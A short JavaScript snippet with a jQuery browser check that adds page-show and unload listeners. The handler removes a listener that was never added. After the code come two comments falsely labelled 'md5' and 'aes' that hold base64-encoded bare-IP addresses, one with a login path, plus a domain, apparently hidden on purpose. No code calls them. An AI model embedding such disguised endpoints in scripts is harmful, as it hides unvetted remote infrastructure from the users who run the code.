if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjEwOC4xNDQuMTYzOjgwMDgvIy9sb2dpbi9sb2dpbixodHRwczovL3d3dy5zaGJ2aWtsaC5jb20=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/